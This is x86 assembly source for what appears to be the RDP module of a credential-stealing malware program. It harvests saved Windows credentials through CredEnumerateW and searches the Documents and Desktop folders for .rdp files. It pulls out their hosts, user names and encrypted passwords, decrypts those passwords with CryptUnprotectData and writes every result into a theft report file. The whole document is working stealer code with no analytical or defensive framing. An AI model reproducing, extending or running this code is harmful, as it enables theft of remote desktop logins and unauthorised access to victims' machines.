.data?
      rdp_host       db    200h dup (?)
      rdp_user       db    200h dup (?)
      rdp_pwd        db    200h dup (?)
      rdp_scan_dir   db    200h dup (?)
      rdpfd          WIN32_FIND_DATA <>
      rdp_tmp_8b_1   db    20h  dup (?)
      rdp_tmp_8b_2   db    20h  dup (?)
      align 4
      RDP_InBlob     DATA_BLOB <>
      RDP_OutBlob    DATA_BLOB <>
      
      
.code

RDP_WriteToLog proc
      lstrlenW, addr rdp_host
      imul    eax, eax, 2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr rdp_host, plen, addr SNW, NULL
      
      lstrlenW, addr rdp_user
      imul    eax, eax, 2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr rdp_user, plen, addr SNW, NULL
      
      lstrlenW, addr rdp_pwd
      imul    eax, eax, 2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr rdp_pwd, plen, addr SNW, NULL
      ret
RDP_WriteToLog endp

GetRDPPwd1  proc
      LOCAL   count:DWORD
      LOCAL   credb:DWORD
      
      lea     eax, credb
      push    eax
      lea     eax, count
      push    eax
      push    0
      push    offset rdpmask1
      call    dword ptr [_CredEnumerateW]
      cmp     dword ptr [count], 0
      je      rdp_no_cred
      
      xor     esi, esi
      mov     ecx, dword ptr [count]
    rdp_cred_enum_lp:
      push    ecx
      push    esi
      
      mov     eax, dword ptr [credb]
      mov     eax, dword ptr [eax+esi*4]
      push    eax
      ; pwd
      mov     eax, dword ptr [eax+1Ch]
      lstrcpyW, addr rdp_pwd, eax
      pop     eax
      
      mov     ecx, dword ptr [eax+30h]
      push    eax
      lstrcpyW, addr rdp_user, ecx
      pop     eax
      mov     eax, dword ptr [eax+08h]
      lstrcpyW, addr rdp_host, eax
      
      call    RDP_WriteToLog
      
      pop     esi
      pop     ecx
      inc     esi
      dec     ecx
      jnz     rdp_cred_enum_lp
      
      push    dword ptr [credb]
      call    dword ptr [_CredFree]
    rdp_no_cred:
      
      ret
GetRDPPwd1  endp

GetRDPPwd2  proc
      push    0
      push    CSIDL_PERSONAL
      push    offset rdp_scan_dir
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset rdp_scan_dir
      call    FindRDPFiles
      
      push    0
      push    CSIDL_DESKTOPDIRECTORY
      push    offset rdp_scan_dir
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset rdp_scan_dir
      call    FindRDPFiles
      ret
GetRDPPwd2  endp

Extract proc uses esi pfrom:DWORD
      LOCAL   slen:DWORD
      
      lstrlenW, pfrom
      mov     slen, eax
      
      mov     ecx, slen
      mov     esi, dword ptr [pfrom]
    xtract_lp:
      lodsw
      .if     ( ( ax >= '0' ) && ( ax <= '9' ) ) || ( ( ax >= 'A' ) && ( ax <= 'F' ) )
      
      .else
              mov     word ptr [esi-2], 0
      .endif
      dec     ecx
      jnz     xtract_lp
      
      mov     eax, dword ptr [pfrom]
      
      ret
Extract endp

ProcessRDPFile proc ppath1:DWORD, pfname:DWORD
      LOCAL   hString:DWORD
      LOCAL   ppntr:DWORD
      LOCAL   ppntr2:DWORD
      LOCAL   dwout:DWORD
      LOCAL   hBlobInData:DWORD
      LOCAL   tmphBlobInData:DWORD
      LOCAL   inblobsize:DWORD
      LOCAL   hDecPwd:DWORD
      LOCAL   pstart:DWORD
      
      push    ppath1
      call    _PathFindFileName
      mov     dword ptr [eax], 0
      lstrcat, ppath1, pfname
      
      invoke  MapFile, ppath1, addr mfile, MAP_FILE_A
      test    eax, eax
      je      rdp_skip1
      mov     eax, mfile.dwFileSize
      test    eax, eax
      je      rdp_skip1
      
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, mfile.dwFileSize
      test    eax, eax
      je      rdp_skip2
      mov     hString, eax
      
      ;push    dword ptr [hString]
      ;push    dword ptr [mfile.dwFileSize]
      ;push    dword ptr [mfile.lpMem]
      ;call    UnkTextToString
      RtlMoveMemory, hString, mfile.lpMem, mfile.dwFileSize
      
      ; get login pos
      lstrlenW, hString
      push    eax ;hstacklen
      lstrlenW, addr rdp_str2
      push    eax ; needlelen
      push    dword ptr [hString] ;hstack
      push    offset rdp_str2 ;needle
      call    strposU
      test    eax, eax
      je      rdp_skip3
      add     eax, sizeof rdp_str2 - 2 
      mov     pstart, eax
      ; xtract login
      lstrlenW, pstart
      push    eax ;hstacklen
      lstrlenW, addr crlfW
      push    eax ; needlelen
      push    dword ptr [pstart] ;hstack
      push    offset crlfW ;needle
      call    strposU
      test    eax, eax
      je      rdp_skip3
      ; calc login
      sub     eax, pstart
      test    eax, eax
      je      rdp_skip3
      mov     ecx, eax
      shr     ecx, 1
      add     ecx, 1
      lstrcpynW, addr rdp_user, pstart, ecx
      
      ; get host pos
      lstrlenW, hString
      push    eax ;hstacklen
      lstrlenW, addr rdp_str3
      push    eax ; needlelen
      push    dword ptr [hString] ;hstack
      push    offset rdp_str3 ;needle
      call    strposU
      test    eax, eax
      je      rdp_skip3
      add     eax, sizeof rdp_str3 - 2
      mov     pstart, eax
      ; xtract host
      lstrlenW, pstart
      push    eax ;hstacklen
      lstrlenW, addr crlfW
      push    eax ; needlelen
      push    dword ptr [pstart] ;hstack
      push    offset crlfW ;needle
      call    strposU
      test    eax, eax
      je      rdp_skip3
      ; calc host
      sub     eax, pstart
      test    eax, eax
      je      rdp_skip3
      mov     ecx, eax
      shr     ecx, 1
      add     ecx, 1
      lstrcpynW, addr rdp_host, pstart, ecx
      
      ; get pwd (last)
      lstrlenW, hString
      push    eax ;hstacklen
      lstrlenW, addr rdp_str1
      push    eax ; needlelen
      push    dword ptr [hString] ;hstack
      push    offset rdp_str1 ;needle
      call    strposU
      test    eax, eax
      je      rdp_skip3
      add     eax, sizeof rdp_str1 - 2
      ; extract pwd
      push    eax
      call    Extract
      mov     ppntr, eax
      mov     ppntr2, eax
      
      lstrlenW, ppntr
      shr     eax, 1
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, eax
      test    eax, eax
      je      rdp_skip3
      mov     hBlobInData, eax
      mov     tmphBlobInData, eax
      
      ; loop shit
      lstrlenW, ppntr
      shr     eax, 1
      mov     ecx, eax
      mov     inblobsize, eax ; in tchars
    hex_2_byte_lp:
      push    ecx
      lstrcpyW, addr rdp_tmp_8b_1, addr oxieW
      lstrcpynW, addr rdp_tmp_8b_2, ppntr2, 3
      add     dword ptr [ppntr2], 4
      lstrcatW, addr rdp_tmp_8b_1, addr rdp_tmp_8b_2
      lea     eax, dwout
      push    eax
      push    1
      push    offset rdp_tmp_8b_1
      call    dword ptr [_StrToIntExW]
      mov     cl, byte ptr [dwout]
      mov     eax, dword ptr [tmphBlobInData]
      mov     byte ptr [eax], cl
      add     tmphBlobInData, 1
      pop     ecx
      dec     ecx
      jnz     hex_2_byte_lp
      
      mov     eax, inblobsize
      mov     dword ptr [RDP_InBlob.cbSize], eax
      mov     eax, hBlobInData
      mov     dword ptr [RDP_InBlob.pData], eax
      
      push    offset RDP_OutBlob
      push    CRYPTPROTECT_UI_FORBIDDEN
      push    0
      push    0
      push    0
      push    0
      push    offset RDP_InBlob
      call    dword ptr [_CryptUnprotectData]
      test    eax, eax
      je      rdp_skip4
      
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, RDP_OutBlob.cbSize
      test    eax, eax
      je      rdp_skip4
      mov     hDecPwd, eax
      
      mov     eax, RDP_OutBlob.cbSize
      shr     eax, 1
      add     eax, 1
      ;mov     ecx, dword ptr []
      lstrcpynW, addr rdp_pwd, RDP_OutBlob.pData, eax
      ;WideCharToMultiByte, CP_ACP, 0, RDP_OutBlob.pData, -1, hDecPwd, RDP_OutBlob.cbSize, NULL, NULL
      ;lstrcpy, addr rdp_pwd, hDecPwd
      
      call    RDP_WriteToLog
      
    rdp_skip5:
      HeapFree, hHeap, 0, hDecPwd
    rdp_skip4:
      HeapFree, hHeap, 0, hBlobInData
    rdp_skip3:
      HeapFree, hHeap, 0, hString
    rdp_skip2:
      invoke  UnmapFile, addr mfile
    rdp_skip1:
      
      ret
ProcessRDPFile endp

FindRDPFiles proc ppath:DWORD
      LOCAL   hRDPFind :DWORD
      
      push    dword ptr [ppath]
      call    dword ptr [_PathAddBackslash]
      
      lstrcat, ppath, addr rdpmask2 
      
      FindFirstFile, ppath, addr rdpfd
      mov     dword ptr [hRDPFind], eax
      cmp     eax, -1
      je      FindRDPFiles_fail_1
    FindRDPFiles_search_lp:
      
      push    offset rdpfd.cFileName
      push    dword ptr [ppath]
      call    ProcessRDPFile
      
    FindRDPFiles_skip_search:
      FindNextFile, hRDPFind, addr rdpfd
      test    eax, eax
      jne     FindRDPFiles_search_lp
      FindClose, hRDPFind
      
    FindRDPFiles_fail_1:
      ret
FindRDPFiles endp

GetRDPPwd   proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], RDP_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetRDPPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      call    GetRDPPwd1
      
      call    GetRDPPwd2
      
    GetRDPPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetRDPPwd   endp


